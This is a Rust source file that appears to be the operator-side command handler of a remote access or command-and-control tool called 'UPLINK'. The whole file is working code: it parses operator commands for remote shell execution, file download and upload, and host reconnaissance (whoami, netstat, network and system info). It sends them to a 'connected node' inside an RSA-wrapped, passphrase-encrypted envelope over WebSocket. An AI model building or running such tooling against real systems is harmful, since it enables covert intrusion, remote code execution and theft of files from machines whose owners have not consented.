use std::sync::Arc;
use futures_util::stream::SplitSink;
use tokio::fs;
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::WebSocketStream;
use crate::transport::communication;
use crate::enums::command::Command as NodeCommand;
use crate::crypto::envelope::Envelope;
use indoc::indoc;
use crate::shared_state::shared_state::SharedState;
use rsa::RsaPublicKey;

pub struct TxCommandHandler {
    passphrase: String,
    ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
    connection_active: Arc<Mutex<bool>>,
    no_envelope: bool,
    shared_state: Arc<Mutex<SharedState>>,
}

impl TxCommandHandler {
    pub fn new(
        passphrase: String,
        ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
        no_envelope: bool,
        shared_state: Arc<Mutex<SharedState>>,
    ) -> Self {
        Self { 
            passphrase, 
            ws_sender, 
            connection_active: Arc::new(Mutex::new(true)),
            no_envelope,
            shared_state,
        }
    }

    pub async fn is_connection_active(&self) -> bool {
        *self.connection_active.lock().await
    }

    pub async fn handle_command(&mut self, command: &str) {
        let trimmed_command = command.trim();

        if trimmed_command.is_empty() {
            println!("Empty command received, nothing to execute.");
            return;
        }

        if !self.no_envelope && !self.shared_state_ready().await {
            println!("[!] Session key or public key not available. Initiating handshake...");
            self.send_handshake().await;
            println!("[+] Handshake initiated. Please try the command again after the handshake completes.");
            return;
        }

        match self.parse_command(trimmed_command).await {
            Some(node_command) => self.send_command(node_command).await,
            None => eprintln!("Unknown command: {}", trimmed_command),
        }
    }

    async fn shared_state_ready(&self) -> bool {
        let shared_state = self.shared_state.lock().await;
        shared_state.server_public_key.is_some() && shared_state.session_key.is_some()
    }

    async fn parse_command(&self, command: &str) -> Option<NodeCommand> {
        let parts: Vec<&str> = command.split_whitespace().collect();
        let cmd = parts.get(0)?.to_uppercase();
        let args = parts.get(1..).unwrap_or(&[]).join(" ");

        match cmd.as_str() {
            "H" | "HELP" => {
                self.print_help();
                None
            }
            "TEXT" | "ECHO" | "PRINT" | "MSG" | "T" => Some(NodeCommand::Echo { message: args }),
            "L" | "LIST" | "LS" | "DIR" => Some(NodeCommand::ListFiles),
            "ID" | "WHOAMI" | "WHO" | "W" => Some(NodeCommand::Whoami),
            "PWD" | "WHERE" => Some(NodeCommand::Pwd),
            "NETSTAT" => Some(NodeCommand::Netstat),
            "N" | "NETWORK" | "IFCONFIG" | "IPCONFIG" => Some(NodeCommand::Network),
            "SYSTEM" | "INFO" | "SYSTEMINFO" | "UNAME" => Some(NodeCommand::Info),
            "D" | "GET" | "DOWNLOAD" => self.parse_get_command(&args),
            "U" | "PUT" | "UPLOAD" => self.parse_put_command(&args).await,
            "E" | "X" | "SHELL" | "EXEC" | "RUN" | "CMD" => Some(NodeCommand::Execute { command: args }),
            _ => None,
        }
    }

    fn print_help(&self) {
        let help = indoc!{"
            [UPLINK HELP]:

            H | HELP - Print help
            ECHO | PRINT | MSG | TEXT | T - Send a message to connected node.

            GET | DOWNLOAD | D <remote> <local> - Download a file or directory.
            PUT | UPLOAD | U <local> <remote> - Upload a file or directory.
            LIST | LS | DIR | L - List files in the directory.

            SHELL | EXEC | RUN | CMD | E | X <command> - Execute a shell command on the connected node.

            ID | WHOAMI | WHO | W - Get current user
            PWD | WHERE - Get current directory path
            NETSTAT - Get network connections
            N | NETWORK | IFCONFIG | IPCONFIG - Get network adapter configuration
            SYSTEM | INFO | SYSTEMINFO | UNAME - Get system configuration

            PASSPHRASE - Change the encryption passphrase.
        "};
        println!("{}", help);
    }

    fn parse_get_command(&self, args: &str) -> Option<NodeCommand> {
        let arg_parts: Vec<&str> = args.splitn(2, ' ').collect();
        if arg_parts.len() < 2 {
            eprintln!("GET/DOWNLOAD command requires both file path and local path.");
            None
        } else {
            Some(NodeCommand::GetFile { 
                file_path: arg_parts[0].to_string(), 
                file_local_path: arg_parts[1].to_string() 
            })
        }
    }

    async fn parse_put_command(&self, args: &str) -> Option<NodeCommand> {
        let arg_parts: Vec<&str> = args.splitn(2, ' ').collect();
        if arg_parts.len() < 2 {
            eprintln!("PUT/UPLOAD command requires both file path and upload path.");
            None
        } else {
            let file_path = arg_parts[0].to_string();
            let file_up_path = arg_parts[1].to_string();
            let data = fs::read(&file_path).await.unwrap_or_else(|_| vec![]);
            Some(NodeCommand::PutFile { file_path, file_up_path, data })
        }
    }

    async fn send_command(&self, node_command: NodeCommand) {
        if let Some((public_key, session_key)) = self.get_keys().await {
            let envelope = Envelope::create_encrypted_envelope(
                &public_key, 
                &serde_json::to_vec(&node_command).unwrap(), 
                &session_key
            );

            let serialized_envelope = envelope.to_bytes();
            let encrypted_envelope = communication::prepare_tx(serialized_envelope, &self.passphrase);
            self.send_over_ws(encrypted_envelope).await;
        } else if !self.no_envelope {
            eprintln!("Session key or public key not available. Command not sent.");
        } else {
            let serialized_command = serde_json::to_vec(&node_command).expect("Failed to serialize command");
            let encrypted_command = communication::prepare_tx(serialized_command, &self.passphrase);
            self.send_over_ws(encrypted_command).await;
        }
    }

    async fn get_keys(&self) -> Option<(RsaPublicKey, Vec<u8>)> {
        let shared_state = self.shared_state.lock().await;
        Some((shared_state.server_public_key.clone()?, shared_state.session_key.clone()?))
    }

    async fn send_over_ws(&self, encrypted_data: Vec<u8>) {
        if let Some(ws_sender) = &self.ws_sender {
            let mut sender = ws_sender.lock().await;
            println!("[*] Sending command");

            if let Err(e) = communication::send_binary_data(&mut sender, encrypted_data).await {
                eprintln!("Failed to send encrypted envelope: {}", e);
            }
        } else {
            eprintln!("No active WebSocket connection. Command not sent.");
        }
    }

    async fn send_handshake(&self) {
        let node_command = NodeCommand::Handshake;
        let serialized_command = serde_json::to_vec(&node_command).expect("Failed to serialize handshake command");
        let encrypted_command = communication::prepare_tx(serialized_command, &self.passphrase);
        self.send_over_ws(encrypted_command).await;
    }
}
